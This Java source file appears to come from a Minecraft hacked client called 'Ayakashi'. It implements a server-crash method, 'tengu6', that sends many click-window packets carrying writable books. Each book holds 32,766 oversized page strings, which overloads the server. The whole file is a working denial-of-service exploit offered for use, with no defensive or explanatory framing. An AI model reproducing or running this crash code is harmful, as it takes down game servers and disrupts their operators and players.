package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C0EPacketClickWindow;

@CrashInfo(
        name = "tengu6"
)
public class CrashTengu6 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Tengu method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));
        (new Thread(() -> {
            for (int c = 0; c < packets; c++) {
                ItemStack book = new ItemStack(Items.writable_book);
                NBTTagList l = new NBTTagList();
                for (int i = 0; i < 32766; ++i) {
                    l.appendTag(new NBTTagString("48749265489736578563478564578963896745896745456795679485679456789376794679790679204567967890457890457890457890249578057890578907890454578906457890337890362578904578907890673458675906847598634756094835763904856749583702368476549023687458690459685674950684579687456954769584764598367045986745¸36873456903458674059867345908674596873459867459087609348576983457690845769084576908345769087459068734590673459087690345876903845769072843z5289046789245769045876903487596723948076098234576980453769084537690837490587690834673679836478906789037890234678907890634678903467890367890346789047890634578903457890345678934573949545797578478905678905789058907890789089089078907897893457987432867893467896783454678353456784356789345678934567979356789456456789789789456457805947604936534908670349586734590678346784678936789034367845903678904578934565789346789456789035789"));
                }
                NBTTagCompound tag = new NBTTagCompound();
                tag.setTag("pages", l);
                book.setTagCompound(tag);
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C0EPacketClickWindow(0, 1, 0, 1, book, (short) 0));
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
